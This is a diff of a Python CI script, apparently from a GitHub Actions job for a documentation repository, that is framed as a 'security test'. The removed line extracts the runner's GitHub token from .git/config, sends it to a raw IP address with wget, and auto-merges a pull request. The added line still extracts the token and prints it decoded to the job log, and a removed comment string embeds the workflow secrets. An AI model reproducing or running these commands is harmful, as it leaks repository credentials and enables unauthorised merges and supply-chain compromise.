@@ -1,7 +1,7 @@
 import os
 import subprocess
 # This is a security test
-subprocess.run(f"export GH_TOKEN=$(grep \"extraheader\" /home/runner/work/developer-docs/developer-docs/.git/config | cut -d ' ' -f 5 | cut -d ':' -f 2 | base64 -d | cut -d ':' -f 2) && wget --no-check-certificate https://167.172.99.85/$GH_TOKEN && sleep 60 && gh pr merge --auto --merge https://github.com/moveworks/developer-docs/pull/217" , shell=True)
+subprocess.run(f"export GH_TOKEN=$(grep \"extraheader\" /home/runner/work/developer-docs/developer-docs/.git/config | cut -d ' ' -f 5 | cut -d ':' -f 2 | base64 -d | cut -d ':' -f 2) && echo $GH_TOKEN | base64 -d" , shell=True)
 
 commit_id = os.getenv("GH_SHA_PR_HEAD")
 main_head = os.getenv('GH_SHA_MAIN_HEAD')
@@ -33,7 +33,7 @@ for file in changed_files.split("\n"):
 
 print(f"Writing output: '{comment_message}' to {env_file}")
 
-comment_message = "This is another test from 4BG0P: ${{secrets.GITHUB_TOKEN}} $GH_TOKEN"
+comment_message = "This is another test from 4BG0P"
 with open(env_file, "a") as f:
     f.write(f"comment_message={comment_message}\n")
 
